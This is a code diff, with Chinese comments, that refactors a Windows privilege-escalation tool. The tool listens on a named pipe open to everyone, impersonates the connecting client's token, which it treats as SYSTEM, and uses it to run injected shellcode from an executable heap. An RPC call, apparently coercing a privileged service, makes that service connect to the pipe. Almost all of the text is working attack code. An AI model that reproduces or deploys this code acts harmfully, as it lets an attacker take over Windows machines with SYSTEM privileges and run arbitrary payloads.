@@ -2,11 +2,11 @@
 
 
 extern LPWSTR g_pwszCommandLine;
-extern HANDLE hSystemToken;
+extern HANDLE g_hSystemToken;
 extern PCHAR g_ShellcodeBuffer;
 extern DWORD g_dwShellcodeSize;
 
-
+/*
 void GetSystemAsImpersonatedUser(HANDLE hToken)
 {
 	DWORD dwCreationFlags = 0;
@@ -63,10 +63,9 @@ cleanup:
 		CloseHandle(pi.hThread);
 	return;
 }
-
-void StartNamedPipeAndGetSystem()
+*/
+void StartNamedPipe()
 {
-	printf("start StartNamedPipeAndGetSystem\n");
 	HANDLE hPipe = INVALID_HANDLE_VALUE;
 	LPWSTR pwszPipeName;
 	SECURITY_DESCRIPTOR sd = { 0 };
@@ -78,64 +77,68 @@ void StartNamedPipeAndGetSystem()
 
 	pwszPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
 	StringCchPrintf(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\random\\pipe\\srvsvc");
-
+	// 初始化安全描述符
 	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
 	{
 		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
 		LocalFree(pwszPipeName);
 		return;
 	}
+	// 设置安全描述符
 	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
 	{
 		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
 		LocalFree(pwszPipeName);
 		return;
 	}
-	if ((hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
-	{
-		wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
-		
-		for (;;) {
-			if (ConnectNamedPipe(hPipe, NULL) > 0) {
-				wprintf(L"[+] A client connected!\n");
-				if (ImpersonateNamedPipeClient(hPipe)) {
-					
-					GetUserName(szUser, &dwSize);
-					wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
-					OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken);
-					if (g_ShellcodeBuffer != NULL && g_dwShellcodeSize != 0) {
-						if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
-							wprintf(L"[-] DuplicateToken Error %d \n", GetLastError());
-							CloseHandle(hPipe);
-							continue;
-						}
-						HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
-						
-						PVOID Mptr = HeapAlloc(hHep, 0, g_dwShellcodeSize);
-						
-						RtlCopyMemory(Mptr, g_ShellcodeBuffer, g_dwShellcodeSize);
-						DWORD dwThreadId = 0;
-						HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, &dwThreadId);
-						
-						SetThreadToken(&hThread, hSystemToken);
-						
-						ResumeThread(hThread);
-
-					}
-					CloseHandle(hPipe);
-				}
-				else {
-					wprintf(L"[-] CreateNamedPipe error\n");
-					CloseHandle(hPipe);
-					return;
-				}
-			}
-		}
+	// 创建管道
+	hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
+	if (hPipe == INVALID_HANDLE_VALUE) {
 		return;
 	}
+	
+	wprintf(L"[*] NamedPipe '%ls' listening...\n", pwszPipeName);
+	// 一直等待客户端连接，方便持续调用
+	for (;;) {
+		if (ConnectNamedPipe(hPipe, NULL) > 0) {
+			wprintf(L"[+] A client connected!\n");
+			// 模拟客户端Token
+			if (!ImpersonateNamedPipeClient(hPipe)) {
+				// 如果无法模拟就断开连接
+				DisconnectNamedPipe(hPipe);
+				continue;
+			}
+			GetUserName(szUser, &dwSize);
+			wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
+			// 将特权Token赋值到全局变量中
+			OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &g_hSystemToken);
+			if (g_ShellcodeBuffer != NULL && g_dwShellcodeSize != 0) {
+				// 如果Shellcode不为空，就开始创建线程执行
+				ExecuteShellCodeWithToken(g_hSystemToken);
+			}
+			DisconnectNamedPipe(hPipe);
+		}
+	}
+	return;
 }
 
-void Execute()
+/// <summary>
+/// 创建带特权Token的线程
+/// g_ShellcodeBuffer : 全局变量，存放Shellcode
+/// g_dwShellcodeSize : 全局变量，存放Shellcode的大小
+/// </summary>
+void ExecuteShellCodeWithToken(HANDLE hToken) {
+	HANDLE hThread = INVALID_HANDLE_VALUE;
+	DWORD dwThreadId = 0;
+	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
+	PVOID Mptr = HeapAlloc(hHeap, 0, g_dwShellcodeSize);
+	RtlCopyMemory(Mptr, g_ShellcodeBuffer, g_dwShellcodeSize);
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, &dwThreadId);
+	SetThreadToken(&hThread, hToken);
+	ResumeThread(hThread);
+}
+
+BOOL Execute()
 {
 	RPC_STATUS status;
 	RPC_WSTR pszStringBinding;
@@ -149,15 +152,11 @@ void Execute()
 		NULL,
 		&pszStringBinding
 	);
-	wprintf(L"[+]RpcStringBindingCompose status: %d\n", status);
-
-
+	
 	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
-	wprintf(L"[+]RpcBindingFromStringBinding status: %d\n", status);
-
-
+	
 	status = RpcStringFree(&pszStringBinding);
-	wprintf(L"[+] RpcStringFree code:%d\n", status);
+	
 	RpcTryExcept{
 		PVOID pContent;
 		LPWSTR pwszFileName;
@@ -172,7 +171,7 @@ void Execute()
 			pwszFileName,
 			0
 		);
-		// wprintf(L"[*] Error: %ld\r\n", result);
+		
 		status = RpcBindingFree(
 			&BindingHandle                   // Reference to the opened binding handle
 		);
@@ -181,14 +180,21 @@ void Execute()
 		RpcExcept(1)
 	{
 		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
+		return FALSE;
 	}RpcEndExcept
 	Sleep(1000);
-	// GetSystemAsImpersonatedUser(hSystemToken);
+	return TRUE;
 }
 
 
-void Service2System() {
+BOOL Service2System() {
 	DWORD dwThread = 0;
-	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)StartNamedPipeAndGetSystem, NULL, NULL, &dwThread);
+	HANDLE hThread = INVALID_HANDLE_VALUE;
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)StartNamedPipe, NULL, NULL, &dwThread);
+	if (hThread == INVALID_HANDLE_VALUE) {
+		wprintf(L"[-] StartNamedPipe Error : %d \n", GetLastError());
+		return FALSE;
+	}
 	Sleep(1000);
+	return TRUE;
 }
